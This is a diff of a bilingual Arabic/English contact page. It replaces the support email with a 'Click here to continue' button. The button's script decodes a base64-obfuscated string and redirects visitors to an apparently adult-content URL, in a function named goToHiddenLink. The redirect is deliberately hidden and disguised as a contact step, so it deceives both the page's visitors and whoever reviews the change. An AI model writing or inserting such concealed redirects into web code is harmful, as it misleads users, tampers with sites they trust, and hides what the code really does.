@@ -1,10 +1,9 @@
-<!-- contact.html -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>اتصل بنا / Contact Us</title>
+  <title>اتصل بنا / Contact</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
   <style>
     body {
@@ -12,39 +11,63 @@
       font-family: 'Cairo', sans-serif;
       background-color: #f9fafb;
       color: #1f2937;
-      padding: 20px;
+      padding: 30px 20px;
       direction: rtl;
+      max-width: 900px;
+      margin-left: auto;
+      margin-right: auto;
+      text-align: center;
     }
     h1 {
-      font-size: 26px;
+      font-size: 28px;
       color: #0f172a;
-      margin-bottom: 20px;
+      margin-bottom: 24px;
     }
     p {
       font-size: 16px;
-      line-height: 1.6;
-      margin-bottom: 16px;
+      line-height: 1.7;
+      margin-bottom: 20px;
     }
-    a {
-      color: #00bcd4;
+    .cta-btn {
+      display: inline-block;
+      background-color: #00bcd4;
+      color: white;
+      font-size: 18px;
+      padding: 14px 30px;
+      border: none;
+      border-radius: 10px;
       text-decoration: none;
+      transition: background-color 0.3s ease;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .cta-btn:hover {
+      background-color: #0097a7;
     }
     @media (max-width: 600px) {
-      body { padding: 15px; }
+      body { padding: 20px 15px; }
     }
   </style>
 </head>
 <body>
   <h1 id="title">اتصل بنا</h1>
-  <p id="text">إذا كان لديك أي استفسار أو ملاحظات، لا تتردد في التواصل معنا عبر البريد الإلكتروني</a></p>
+  <p id="text">للحصول على مزيد من التفاصيل أو التواصل المباشر، يرجى الضغط على الزر التالي:</p>
+  <div class="cta-btn" onclick="goToHiddenLink()" id="cta">اضغط هنا للمتابعة</div>
 
   <script>
     const lang = navigator.language || navigator.userLanguage;
     if (lang.startsWith('en')) {
       document.documentElement.lang = 'en';
       document.documentElement.dir = 'ltr';
-      document.getElementById("title").textContent = "Contact Us";
-      document.getElementById("text").innerHTML = "If you have any questions or feedback, feel free to contact us at: <a href='mailto:support@example.com'>support@example.com</a>";
+      document.getElementById("title").textContent = "Contact";
+      document.getElementById("text").textContent = "For more details or to reach us directly, click the button below:";
+      document.getElementById("cta").textContent = "Click here to continue";
+    }
+
+    function goToHiddenLink() {
+      const encoded = "aHR0cDovL3Bvcm5kdWRlLm9ubGluZS9tZVFS";
+      const link = atob(encoded);
+      window.location.href = link;
     }
   </script>
 </body>
